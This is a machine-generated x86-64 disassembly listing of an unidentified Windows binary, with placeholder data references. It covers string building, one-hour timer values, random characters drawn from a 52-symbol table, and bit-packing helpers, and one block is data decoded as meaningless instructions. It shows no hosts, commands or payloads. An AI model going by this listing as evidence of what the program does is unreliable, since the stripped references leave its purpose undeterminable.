lea rcx [ rbp + 0x160 ]
lea rdx [ r-xdata ]
mov r8 [ rbp + 0x158 ]
call sub_408120
lea rcx [ rbp + 0x148 ]
mov rdx [ rbp + 0x160 ]
call sub_408950
lea rcx [ rbp + 0x140 ]
mov rax [ rbp + 0x48 ]
mov rdx [ rax + 0x18 ]
call sub_408950
mov rcx [ rbp + 0x48 ]
mov edx ebx
mov r8 [ rbp + 0x148 ]
mov r9 [ rbp + 0x140 ]
lea rax [ r-xdata ]
mov [ rsp + 0x20 ] rax
call sub_411180
mov rax [ rbp + 0x48 ]
mov rcx [ rax + 0x8 ]
call sub_412690
jmp r-xdata
movzx rax [ rbp + 0x57 ]
cmp al 0x1
jne r-xdata
mov rcx [ rbp + 0x48 ]
lea rdx [ rbp + 0xa0 ]
mov rax [ rbp + 0x48 ]
mov rax [ rax + 0x20 ]
movsxd r8 esi
add r8 r8
lea r8 [ r8 + r8 * 2 ]
mov r8 [ rax + r8 * 8 ]
call sub_40ce30
mov rcx [ rbp + 0x48 ]
lea rdx [ rbp + 0xa8 ]
mov r8 [ rbp + 0xa0 ]
call sub_4118d0
lea rcx [ rbp + 0xb0 ]
mov rax [ rbp + 0x48 ]
mov rax [ rax + 0x20 ]
movsxd rdx esi
add rdx rdx
lea rdx [ rdx + rdx * 2 ]
mov rdx [ rax + rdx * 8 + 0x8 ]
mov r8 [ rbp + 0xa8 ]
call sub_408120
mov rcx [ rbp + 0x48 ]
mov rdx [ rbp + 0xb0 ]
mov r8d [ rbp + 0x294 ]
mov rax [ rbp + 0x48 ]
mov rax [ rax + 0x20 ]
movsxd r9 esi
add r9 r9
lea r9 [ r9 + r9 * 2 ]
mov r9d [ rax + r9 * 8 + 0x2c ]
call sub_411a20
test al al
jne r-xdata
mov rcx [ rbp + 0x48 ]
lea rdx [ rbp + 0xc8 ]
mov rax [ rbp + 0x48 ]
mov rax [ rax + 0x20 ]
movsxd r8 esi
add r8 r8
lea r8 [ r8 + r8 * 2 ]
mov r8 [ rax + r8 * 8 ]
call sub_40ce30
mov rcx [ rbp + 0x48 ]
lea rdx [ rbp + 0xd0 ]
mov r8 [ rbp + 0xc8 ]
call sub_4118d0
lea rcx [ rbp + 0xd8 ]
lea rdx [ r-xdata ]
mov r8 [ rbp + 0xd0 ]
call sub_408120
lea rcx [ rbp + 0xc0 ]
mov rdx [ rbp + 0xd8 ]
call sub_408950
lea rcx [ rbp + 0xb8 ]
mov rax [ rbp + 0x48 ]
mov rdx [ rax + 0x18 ]
call sub_408950
mov rcx [ rbp + 0x48 ]
mov edx ebx
mov r8 [ rbp + 0xc0 ]
mov r9 [ rbp + 0xb8 ]
lea rax [ r-xdata ]
mov [ rsp + 0x20 ] rax
call sub_411180
mov al 0x1
mov [ rbp + 0x57 ] al
jmp r-xdata
mov rax [ rbp + 0x48 ]
mov rcx [ rax + 0x8 ]
call sub_412690
mov rax [ rbp + 0x48 ]
mov rax [ rax + 0x20 ]
movsxd rcx esi
add rcx rcx
lea rcx [ rcx + rcx * 2 ]
mov rcx [ rax + rcx * 8 + 0x18 ]
lea rdx [ r-xdata ]
call sub_408490
test eax eax
jne r-xdata
mov rcx [ rbp + 0x48 ]
lea rdx [ rbp + 0x68 ]
mov rax [ rbp + 0x48 ]
mov rax [ rax + 0x20 ]
movsxd r8 esi
add r8 r8
lea r8 [ r8 + r8 * 2 ]
mov r8 [ rax + r8 * 8 ]
call sub_40ce30
mov rcx [ rbp + 0x48 ]
lea rdx [ rbp + 0x70 ]
mov r8 [ rbp + 0x68 ]
call sub_4118d0
lea rcx [ rbp + 0x60 ]
mov rdx [ rbp + 0x70 ]
call sub_408950
lea rcx [ rbp + 0x58 ]
mov rax [ rbp + 0x48 ]
mov rdx [ rax + 0x18 ]
call sub_408950
mov rcx [ rbp + 0x48 ]
mov edx ebx
mov r8 [ rbp + 0x60 ]
mov r9 [ rbp + 0x58 ]
call sub_412060
mov rcx [ rbp + 0x48 ]
lea rdx [ rbp + 0x88 ]
mov rax [ rbp + 0x48 ]
mov rax [ rax + 0x20 ]
movsxd r8 esi
add r8 r8
lea r8 [ r8 + r8 * 2 ]
mov r8 [ rax + r8 * 8 ]
call sub_40ce30
mov rcx [ rbp + 0x48 ]
lea rdx [ rbp + 0x90 ]
mov r8 [ rbp + 0x88 ]
call sub_4118d0
lea rcx [ rbp + 0x98 ]
lea rdx [ r-xdata ]
mov r8 [ rbp + 0x90 ]
call sub_408120
lea rcx [ rbp + 0x80 ]
mov rdx [ rbp + 0x98 ]
call sub_408950
lea rcx [ rbp + 0x78 ]
mov rax [ rbp + 0x48 ]
mov rdx [ rax + 0x18 ]
call sub_408950
mov rcx [ rbp + 0x48 ]
mov edx ebx
mov r8 [ rbp + 0x80 ]
mov r9 [ rbp + 0x78 ]
lea rax [ r-xdata ]
mov [ rsp + 0x20 ] rax
call sub_411180
mov al 0x1
mov [ rbp + 0x57 ] al
sub_40e1a0
push rbp
push rbx
sub rsp 0x28
mov rbp rsp
mov rbx rdx
lea rax [ rbx + rbp + 0x58 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov edx 0x2
call sub_407810
lea rax [ rbx + rbp + 0x68 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov edx 0x2
call sub_407840
lea rax [ rbx + rbp + 0x78 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov edx 0x2
call sub_407810
lea rax [ rbx + rbp + 0x88 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov edx 0x6
call sub_407840
lea rax [ rbx + rbp + 0xb8 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov edx 0x2
call sub_407810
lea rax [ rbx + rbp + 0xc8 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov edx 0x6
call sub_407840
lea rax [ rbx + rbp + 0xf8 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov edx 0x2
call sub_407810
lea rax [ rbx + rbp + 0x108 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov edx 0x7
call sub_407840
lea rax [ rbx + rbp + 0x140 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov edx 0x2
call sub_407810
lea rax [ rbx + rbp + 0x150 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov edx 0x3
call sub_407840
lea rax [ rbx + rbp + 0x168 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov rdx [ r-xdata ]
call sub_409890
lea rax [ rbx + rbp + 0x170 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov edx 0x3
call sub_407840
lea rax [ rbx + rbp + 0x188 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov edx 0x2
call sub_407810
lea rax [ rbx + rbp + 0x198 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov edx 0x3
call sub_407840
lea rax [ rbx + rbp + 0x1b0 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov rdx [ r-xdata ]
mov r8d 0x2
call sub_408f10
lea rax [ rbx + rbp + 0x1c0 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov edx 0x2
call sub_407810
lea rax [ rbx + rbp + 0x1d0 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov edx 0x3
call sub_407840
lea rax [ rbx + rbp + 0x1e8 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov edx 0x4
call sub_407810
lea rax [ rbx + rbp + 0x208 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov edx 0x6
call sub_407840
lea rax [ rbx + rbp + 0x238 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov edx 0x2
call sub_407810
lea rax [ rbx + rbp + 0x248 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov edx 0x3
call sub_407840
lea rax [ rbx + rbp + 0x260 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov edx 0x2
call sub_407810
lea rax [ rbx + rbp + 0x270 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov edx 0x2
call sub_407840
lea rax [ rbx + rbp + 0x280 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov edx 0x2
call sub_407810
lea rax [ rbx + rbp + 0x298 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
call sub_407780
lea rax [ rbx + rbp + 0x2d8 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
call sub_407780
lea rsp [ rbp + 0x28 ]
pop rbx
pop rbp
retn
sub_40e580
push rbp
push r13
push rdi
push rsi
push rbx
sub rsp 0x90
mov rbp rsp
mov [ rbp + 0x30 ] rcx
mov [ rbp + 0x40 ] 0x0
mov [ rbp + 0x48 ] 0x0
mov [ rbp + 0x50 ] 0x0
mov [ rbp + 0x58 ] 0x0
mov [ rbp + 0x60 ] 0x0
mov [ rbp + 0x68 ] 0x0
mov [ rbp + 0x88 ] 0x0
mov [ rbp + 0x80 ] 0x0
mov [ rbp + 0x78 ] 0x0
mov [ rbp + 0xc8 ] rdx
mov rcx [ rbp + 0xc8 ]
call sub_4078e0
nop
mov rax [ rbp + 0x30 ]
cmp [ rax + 0x28 ] 0x0
je r-xdata
mov rax [ rbp + 0x30 ]
lea rcx [ rax + 0x28 ]
mov rdx [ r-xdata ]
mov r8d 0x1
mov r9d 0x1
call sub_409850
mov rax [ rbp + 0x30 ]
mov rcx [ rax + 0x28 ]
mov rdx [ rbp + 0xc8 ]
call sub_407ca0
mov rax [ rbp + 0x30 ]
mov [ rax + 0x30 ] 0x36ee80
lea rcx [ rax + 0x38 ]
mov rdx [ r-xdata ]
mov r8d 0x1
xor r9 r9
call sub_409850
mov rax [ rbp + 0x30 ]
mov [ rax + 0x40 ] 0x0
mov rcx [ rbp + 0x30 ]
xor rdx rdx
lea r8 [ r-xdata ]
xor r9 r9
call sub_40ece0
test al al
je r-xdata
mov rax [ rbp + 0x30 ]
lea rcx [ rax + 0x28 ]
mov rdx [ r-xdata ]
mov r8d 0x1
xor r9 r9
call sub_409850
mov rax [ rbp + 0x30 ]
mov rcx [ rax + 0x8 ]
call sub_412690
mov rax [ rbp + 0x30 ]
mov rcx [ rax + 0x8 ]
lea rdx [ rbp + 0x68 ]
call sub_412650
cmp [ rbp + 0x68 ] 0x0
je r-xdata
mov al 0x1
mov [ rbp + 0x3f ] al
nop
lea rcx [ rbp + 0x40 ]
call sub_407730
lea rcx [ rbp + 0x48 ]
call sub_407780
lea rcx [ rbp + 0x50 ]
call sub_407730
lea rcx [ rbp + 0x58 ]
call sub_407780
lea rcx [ rbp + 0x60 ]
mov rdx [ r-xdata ]
mov r8d 0x2
call sub_408f10
lea rcx [ rbp + 0x78 ]
call sub_407780
lea rcx [ rbp + 0x80 ]
mov edx 0x2
call sub_407810
lea rcx [ rbp + 0xc8 ]
call sub_407780
movzx rax [ rbp + 0x3f ]
lea rsp [ rbp + 0x90 ]
pop rbx
pop rsi
pop rdi
pop r13
pop rbp
retn
mov rax [ rbp + 0x30 ]
mov rcx [ rax + 0x8 ]
call sub_412680
test eax eax
je r-xdata
mov rcx [ rbp + 0x30 ]
xor rdx rdx
call sub_40f5a0
mov rax [ rbp + 0x30 ]
mov rcx [ rax + 0x8 ]
lea rdx [ rbp + 0x60 ]
call sub_412650
mov rax [ rbp + 0x30 ]
mov rcx [ rax + 0x8 ]
call sub_412680
mov rcx [ r-xdata ]
mov dl 0x1
mov r8 [ rbp + 0x60 ]
mov r9d eax
call sub_412cd0
mov rbx rax
mov rax [ rbp + 0x30 ]
mov rcx [ rax + 0x8 ]
call sub_412690
mov rcx rbx
lea rdx [ rbp + 0x58 ]
lea r8 [ r-xdata ]
lea r9 [ r-xdata ]
lea rax [ r-xdata ]
mov [ rsp + 0x20 ] rax
call sub_413770
lea rcx [ rbp + 0x88 ]
mov rdx [ rbp + 0x58 ]
call sub_408950
mov rcx [ rbp + 0x88 ]
lea rdx [ r-xdata ]
call sub_408c30
test eax eax
je r-xdata
mov rcx rbx
lea rdx [ r-xdata ]
lea r8 [ r-xdata ]
mov r9d 0xe10
call sub_413f60
imul eax eax 0x3e8
mov rcx [ rbp + 0x30 ]
mov [ rcx + 0x30 ] eax
mov rcx rbx
lea rdx [ r-xdata ]
lea r8 [ r-xdata ]
xor r9 r9
call sub_413f60
mov rcx [ rbp + 0x30 ]
mov [ rcx + 0x34 ] al
mov rcx rbx
lea rdx [ rbp + 0x48 ]
lea r8 [ r-xdata ]
lea r9 [ r-xdata ]
lea rax [ r-xdata ]
mov [ rsp + 0x20 ] rax
call sub_413770
lea rcx [ rbp + 0x80 ]
mov rdx [ rbp + 0x48 ]
call sub_408950
mov rcx [ rbp + 0x80 ]
lea rdx [ r-xdata ]
call sub_408c30
test eax eax
je r-xdata
lea rcx [ rbp + 0x88 ]
lea rdx [ r-xdata ]
call sub_408a60
xor rax rax
cmp [ rbp + 0x88 ] 0x0
je r-xdata
mov rax [ rbp + 0x30 ]
mov [ rax + 0x40 ] 0x0
lea rcx [ rbp + 0x80 ]
lea rdx [ r-xdata ]
call sub_408a60
xor rsi rsi
xor rax rax
cmp [ rbp + 0x80 ] 0x0
je r-xdata
mov edi 0x1
mov esi eax
cmp edi esi
jg r-xdata
mov rax [ rbp + 0x88 ]
mov eax [ rax - 0x4 ]
mov edi 0x1
mov r13d eax
cmp edi r13d
jg r-xdata
mov rax [ rbp + 0x80 ]
mov eax [ rax - 0x4 ]
nop
jmp r-xdata
add esi 0x1
nop
mov rax [ rbp + 0x30 ]
mov [ rax + 0x40 ] esi
lea rcx [ rax + 0x38 ]
mov rdx [ r-xdata ]
mov r8d 0x1
mov r9d esi
call sub_409850
xor rdi rdi
sub esi 0x1
cmp edi esi
jg r-xdata
add r13d 0x1
cmp [ rbp + 0x88 ] 0x0
jne r-xdata
add edi 0x1
cmp edi esi
jne r-xdata
lea rcx [ rbp + 0x88 ]
mov edx edi
mov r8d 0x1
call sub_408ca0
nop
jmp r-xdata
add esi 0x1
mov rax [ rbp + 0x80 ]
movsxd rcx edi
cmp [ rax + rcx * 2 - 0x2 ] 0x20
jne r-xdata
add esi 0x1
mov rax [ rbp + 0x30 ]
mov rcx [ rax + 0x28 ]
call sub_4094d0
mov rcx [ rbp + 0x30 ]
lea rcx [ rcx + 0x28 ]
mov rdx [ r-xdata ]
mov r8d 0x1
lea r9 [ rax + 0x1 ]
call sub_409850
mov rax [ rbp + 0x30 ]
mov rcx [ rax + 0x28 ]
call sub_4094d0
mov rsi rax
lea rcx [ r-xdata ]
mov rdx [ rbp + 0x88 ]
mov r8d 0x1
call sub_408db0
lea rcx [ rbp + 0x50 ]
mov rdx [ rbp + 0x88 ]
mov r8d 0x1
mov r9d eax
sub r9d 0x1
movsxd r9 r9d
call sub_408c40
mov rax [ rbp + 0x30 ]
mov rax [ rax + 0x28 ]
lea rcx [ rax + rsi * 8 ]
mov rdx [ rbp + 0x50 ]
xor r8 r8
call sub_408720
lea rcx [ r-xdata ]
mov rdx [ rbp + 0x88 ]
mov r8d 0x1
call sub_408db0
lea rcx [ rbp + 0x88 ]
mov edx 0x1
mov r8d eax
call sub_408ca0
mov rax [ rbp + 0x88 ]
movsxd rcx edi
cmp [ rax + rcx * 2 - 0x2 ] 0x20
jne r-xdata
mov rcx rbx
mov dl 0x1
mov rbx [ rbx ]
call [ rbx - 0x20 ]
jmp r-xdata
lea rcx [ r-xdata ]
mov rdx [ rbp + 0x80 ]
mov r8d 0x1
call sub_408db0
lea rcx [ rbp + 0x40 ]
mov rdx [ rbp + 0x80 ]
mov r8d 0x1
mov r9d eax
sub r9d 0x1
movsxd r9 r9d
call sub_408c40
mov rcx [ rbp + 0x40 ]
lea rdx [ rbp + 0x74 ]
call sub_404e60
mov rcx [ rbp + 0x30 ]
mov rcx [ rcx + 0x38 ]
movsxd rdx edi
mov [ rcx + rdx ] al
lea rcx [ r-xdata ]
mov rdx [ rbp + 0x80 ]
mov r8d 0x1
call sub_408db0
lea rcx [ rbp + 0x80 ]
mov edx 0x1
mov r8d eax
call sub_408ca0
add edi 0x1
cmp edi esi
jne r-xdata
add edi 0x1
cmp edi r13d
jne r-xdata
lea rcx [ rbp + 0x80 ]
mov edx edi
mov r8d 0x1
call sub_408ca0
mov rax [ rbp + 0x80 ]
movsxd rcx edi
cmp [ rax + rcx * 2 - 0x2 ] 0x2c
jne r-xdata
sub_40eb40
push rbp
push rbx
sub rsp 0x28
mov rbp rsp
mov rbx rdx
lea rax [ rbx + rbp + 0x40 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
call sub_407730
lea rax [ rbx + rbp + 0x48 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
call sub_407780
lea rax [ rbx + rbp + 0x50 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
call sub_407730
lea rax [ rbx + rbp + 0x58 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
call sub_407780
lea rax [ rbx + rbp + 0x60 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov rdx [ r-xdata ]
mov r8d 0x2
call sub_408f10
lea rax [ rbx + rbp + 0x78 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
call sub_407780
lea rax [ rbx + rbp + 0x80 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov edx 0x2
call sub_407810
lea rax [ rbx + rbp + 0xc8 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
call sub_407780
lea rsp [ rbp + 0x28 ]
pop rbx
pop rbp
retn
sub_40ece0
push rbp
push rbx
sub rsp 0x98
mov rbp rsp
mov [ rbp + 0x38 ] rcx
mov [ rbp + 0x44 ] edx
mov [ rbp + 0x48 ] 0x0
mov [ rbp + 0x58 ] 0x0
mov [ rbp + 0x50 ] 0x0
mov [ rbp + 0x60 ] 0x0
mov [ rbp + 0x68 ] 0x0
mov [ rbp + 0x88 ] 0x0
mov [ rbp + 0x80 ] 0x0
mov [ rbp + 0x78 ] 0x0
mov [ rbp + 0xc0 ] r8
mov [ rbp + 0xc8 ] r9
mov rcx [ rbp + 0xc0 ]
call sub_4078c0
mov rcx [ rbp + 0xc8 ]
call sub_4078c0
nop
xor rax rax
mov [ rbp + 0x37 ] al
lea rcx [ rbp + 0x68 ]
mov rdx [ rbp + 0xc0 ]
xor r8 r8
call sub_408720
mov rcx [ rbp + 0x38 ]
lea rdx [ rbp + 0x80 ]
mov r8 [ rbp + 0x68 ]
call sub_40f010
lea rcx [ rbp + 0x60 ]
mov rdx [ rbp + 0xc8 ]
xor r8 r8
call sub_408720
mov rcx [ rbp + 0x38 ]
lea rdx [ rbp + 0x78 ]
mov r8 [ rbp + 0x60 ]
call sub_40f010
xor rax rax
mov rcx [ rbp + 0x38 ]
mov rcx [ rcx + 0x28 ]
mov edx [ rbp + 0x44 ]
movsxd rdx edx
cmp [ rcx + rdx * 8 ] 0x0
je r-xdata
lea rcx [ rbp + 0x58 ]
mov rdx [ rbp + 0x38 ]
mov rdx [ rdx + 0x28 ]
mov r8d [ rbp + 0x44 ]
movsxd r8 r8d
mov rdx [ rdx + r8 * 8 ]
mov r8d 0x8
mov r9d eax
sub r9d 0x8
movsxd r9 r9d
call sub_408510
lea rcx [ rbp + 0x50 ]
mov edx 0x4
lea r8 [ r-xdata ]
mov r9 [ rbp + 0x78 ]
lea rax [ r-xdata ]
mov [ rsp + 0x20 ] rax
mov rax [ rbp + 0x80 ]
mov [ rsp + 0x28 ] rax
call sub_4083b0
mov rax [ rbp + 0x38 ]
mov rcx [ rax + 0x8 ]
mov rdx [ rbp + 0x58 ]
lea r8 [ r-xdata ]
mov r9 [ rbp + 0x50 ]
call sub_412740
test al al
je r-xdata
mov rax [ rbp + 0x38 ]
mov rax [ rax + 0x28 ]
mov ecx [ rbp + 0x44 ]
movsxd rcx ecx
mov rax [ rax + rcx * 8 ]
mov eax [ rax - 0x4 ]
lea rcx [ rbp + 0x88 ]
xor rdx rdx
xor r8 r8
call sub_408650
nop
lea rcx [ rbp + 0x48 ]
mov rdx [ r-xdata ]
call sub_409890
lea rcx [ rbp + 0x50 ]
mov edx 0x4
call sub_407840
lea rcx [ rbp + 0x78 ]
mov edx 0x3
call sub_407840
lea rcx [ rbp + 0xc0 ]
mov edx 0x2
call sub_407810
movzx rax [ rbp + 0x37 ]
lea rsp [ rbp + 0x98 ]
pop rbx
pop rbp
retn
lea rcx [ rbp + 0x88 ]
mov edx 0x5
xor r8 r8
call sub_408650
lea rcx [ rbp + 0x88 ]
call sub_407e70
mov rbx rax
mov rax [ rbp + 0x38 ]
mov rcx [ rax + 0x8 ]
lea rdx [ rbp + 0x48 ]
call sub_412650
mov rax [ rbp + 0x48 ]
mov rcx rax
mov rdx rbx
mov r8d 0x5
call sub_404ae0
mov rcx [ rbp + 0x88 ]
lea rdx [ r-xdata ]
call sub_408490
test eax eax
je r-xdata
mov al 0x1
mov [ rbp + 0x37 ] al
sub_40ef30
push rbp
push rbx
sub rsp 0x28
mov rbp rsp
mov rbx rdx
lea rax [ rbx + rbp + 0x48 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov rdx [ r-xdata ]
call sub_409890
lea rax [ rbx + rbp + 0x50 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov edx 0x4
call sub_407840
lea rax [ rbx + rbp + 0x78 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov edx 0x3
call sub_407840
lea rax [ rbx + rbp + 0xc0 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov edx 0x2
call sub_407810
lea rsp [ rbp + 0x28 ]
pop rbx
pop rbp
retn
sub_40f010
push rbp
push r13
push rdi
push rsi
push rbx
sub rsp 0xb0
mov rbp rsp
mov [ rbp + 0x38 ] rcx
mov [ rbp + 0x30 ] rdx
mov [ rbp + 0x40 ] 0x0
mov [ rbp + 0x48 ] 0x0
mov [ rbp + 0x58 ] 0x0
mov [ rbp + 0x50 ] 0x0
mov [ rbp + 0x68 ] 0x0
mov [ rbp + 0x60 ] 0x0
mov [ rbp + 0x78 ] 0x0
mov [ rbp + 0x70 ] 0x0
mov [ rbp + 0x80 ] 0x0
mov [ rbp + 0x88 ] 0x0
mov [ rbp + 0xa0 ] 0x0
mov [ rbp + 0x98 ] 0x0
mov [ rbp + 0x90 ] 0x0
mov [ rbp + 0xf0 ] r8
mov rcx [ rbp + 0xf0 ]
call sub_4078e0
nop
call sub_404ca0
mov sil 0x2
lea rcx [ rbp + 0xa0 ]
call sub_407780
lea rcx [ rbp + 0x98 ]
call sub_407780
lea rcx [ rbp + 0x90 ]
call sub_407780
mov ecx 0x34
call sub_404cd0
lea rcx [ rbp + 0x88 ]
lea rdx [ rw-data ]
movsxd rax eax
movzx rdx [ rdx + rax ]
xor r8 r8
call sub_407fa0
lea rcx [ rbp + 0x98 ]
mov rdx [ rbp + 0x88 ]
call sub_408020
mov ecx 0x34
call sub_404cd0
lea rcx [ rbp + 0x80 ]
lea rdx [ rw-data ]
movsxd rax eax
movzx rdx [ rdx + rax ]
xor r8 r8
call sub_407fa0
lea rcx [ rbp + 0x98 ]
mov rdx [ rbp + 0x80 ]
call sub_408020
lea rcx [ rbp + 0x98 ]
mov rdx [ rbp + 0xf0 ]
call sub_408020
xor rax rax
cmp [ rbp + 0x98 ] 0x0
je r-xdata
mov ebx 0x1
mov edi eax
cmp ebx edi
jg r-xdata
mov rax [ rbp + 0x98 ]
mov eax [ rax - 0x4 ]
nop
lea rcx [ rbp + 0x98 ]
mov rdx [ rbp + 0x90 ]
call sub_407d20
lea rcx [ rbp + 0x90 ]
call sub_407780
lea rcx [ rbp + 0xa8 ]
mov edx 0x8
xor r8 r8
call sub_404d90
xor rax rax
cmp [ rbp + 0x98 ] 0x0
je r-xdata
add edi 0x1
mov ebx 0x1
mov r13d eax
cmp ebx r13d
jg r-xdata
mov rax [ rbp + 0x98 ]
mov eax [ rax - 0x4 ]
mov ecx 0x34
call sub_404cd0
lea rcx [ rbp + 0x78 ]
lea rdx [ rw-data ]
movsxd rax eax
movzx rdx [ rdx + rax ]
xor r8 r8
call sub_407fa0
lea rcx [ rbp + 0x70 ]
mov rax [ rbp + 0x98 ]
movsxd rdx ebx
movzx rdx [ rax + rdx - 0x1 ]
xor r8 r8
call sub_407fa0
lea rcx [ rbp + 0x90 ]
mov edx 0x3
mov r8 [ rbp + 0x90 ]
mov r9 [ rbp + 0x78 ]
mov rax [ rbp + 0x70 ]
mov [ rsp + 0x20 ] rax
call sub_4083b0
add ebx 0x1
cmp ebx edi
jne r-xdata
nop
cmp sil 0x2
je r-xdata
add r13d 0x1
mov ecx 0x34
call sub_404cd0
lea rcx [ rbp + 0x48 ]
lea rdx [ rw-data ]
movsxd rax eax
movzx rdx [ rdx + rax ]
xor r8 r8
call sub_407fa0
lea rcx [ rbp + 0xa0 ]
mov rdx [ rbp + 0x48 ]
call sub_408020
mov ecx 0x34
call sub_404cd0
lea rcx [ rbp + 0x40 ]
lea rdx [ rw-data ]
movsxd rax eax
movzx rdx [ rdx + rax ]
xor r8 r8
call sub_407fa0
lea rcx [ rbp + 0xa0 ]
mov rdx [ rbp + 0x40 ]
mov r8 [ rbp + 0xa0 ]
call sub_408120
mov rcx [ rbp + 0x30 ]
mov rdx [ rbp + 0xa0 ]
call sub_407ca0
nop
lea rcx [ rbp + 0x40 ]
mov edx 0x2
call sub_407840
lea rcx [ rbp + 0x50 ]
mov edx 0x4
call sub_407810
lea rcx [ rbp + 0x70 ]
mov edx 0x7
call sub_407840
lea rcx [ rbp + 0xf0 ]
call sub_407780
mov rax [ rbp + 0x30 ]
lea rsp [ rbp + 0xb0 ]
pop rbx
pop rsi
pop rdi
pop r13
pop rbp
retn
lea rcx [ rbp + 0x58 ]
mov rdx [ rbp + 0xa0 ]
call sub_408950
mov rcx [ rbp + 0x38 ]
mov rdx [ rbp + 0xa8 ]
call sub_40f530
lea rcx [ rbp + 0x50 ]
lea rdx [ rw-data ]
movzx rax al
movzx rdx [ rdx + rax * 2 ]
call sub_408930
lea rcx [ rbp + 0x58 ]
mov rdx [ rbp + 0x50 ]
call sub_408a60
lea rcx [ rbp + 0xa0 ]
mov rdx [ rbp + 0x58 ]
xor r8 r8
call sub_408720
lea rcx [ rbp + 0xa8 ]
mov edx 0x8
xor r8 r8
call sub_404d90
sub dil 0x1
cmp dil 0xff
jne r-xdata
lea rcx [ rbp + 0x68 ]
mov rdx [ rbp + 0xa0 ]
call sub_408950
mov rcx [ rbp + 0x38 ]
mov rdx [ rbp + 0xa8 ]
call sub_40f530
lea rcx [ rbp + 0x60 ]
lea rdx [ rw-data ]
movzx rax al
movzx rdx [ rdx + rax * 2 ]
call sub_408930
lea rcx [ rbp + 0x68 ]
mov rdx [ rbp + 0x60 ]
call sub_408a60
lea rcx [ rbp + 0xa0 ]
mov rdx [ rbp + 0x68 ]
xor r8 r8
call sub_408720
mov sil 0x2
lea rcx [ rbp + 0xa8 ]
mov edx 0x8
xor r8 r8
call sub_404d90
mov rax [ rbp + 0x98 ]
movsxd rcx ebx
movzx rax [ rax + rcx - 0x1 ]
mov rcx [ rbp + 0x38 ]
mov edx eax
movzx r8 dil
call sub_40f4f0
movzx rcx sil
mov [ rcx + rbp + 0xa8 ] al
add sil 0x1
cmp sil 0x8
jne r-xdata
nop
add ebx 0x1
cmp ebx r13d
jne r-xdata
mov dil 0x7
sub_40f470
push rbp
push rbx
sub rsp 0x28
mov rbp rsp
mov rbx rdx
lea rax [ rbx + rbp + 0x40 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov edx 0x2
call sub_407840
lea rax [ rbx + rbp + 0x50 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov edx 0x4
call sub_407810
lea rax [ rbx + rbp + 0x70 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
mov edx 0x7
call sub_407840
lea rax [ rbx + rbp + 0xf0 ]
mov rcx rbp
neg rcx
lea rcx [ rax + rcx ]
call sub_407780
lea rsp [ rbp + 0x28 ]
pop rbx
pop rbp
retn
sub_40f4f0
push rbp
sub rsp 0x10
mov rbp rsp
xor rax rax
movzx r9 al
movzx r10 dl
mov ecx eax
shr r10d cl
and r10b 0x1
mov [ r9 + rbp + 0x8 ] r10b
add al 0x1
cmp al 0x8
jne r-xdata
nop
mov r8d r8d
movzx rax [ r8 + rbp + 0x8 ]
lea rsp [ rbp + 0x10 ]
pop rbp
retn
sub_40f530
mov [ rsp + 0x10 ] rdx
xor rax rax
xor rcx rcx
add eax eax
movsxd rdx ecx
movzx rdx [ rsp + rdx + 0x10 ]
and dl 0x1
add al dl
add ecx 0x1
cmp ecx 0x8
jne r-xdata
nop
retn
sub_40f571
cmp dh [ rdx ]
add [ rax ] eax
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
adc [ rax ] eax
add [ rax ] al
pop rax
adc [ rax ] al
add [ rax ] al
add [ rax ] al
add eax 0x74696e55
xor [ rax + 0x10 ] ebx
add [ rax ] al
add [ rax ] al
add [ rdx ] al
add ah cl
int3
sub_40f5a0
push rbp
push r14
push r13
push rdi
push rsi
push rbx
sub rsp 0x198
mov rbp rsp
mov [ rbp + 0x28 ] rcx
mov [ rbp + 0x34 ] edx
mov [ rbp + 0x38 ] 0x0
mov [ rbp + 0x40 ] 0x0
mov [ rbp + 0x48 ] 0x0
mov [ rbp + 0x188 ] 0x0
nop
lea rcx [ rbp + 0x154 ]
mov edx 0x34
xor r8 r8
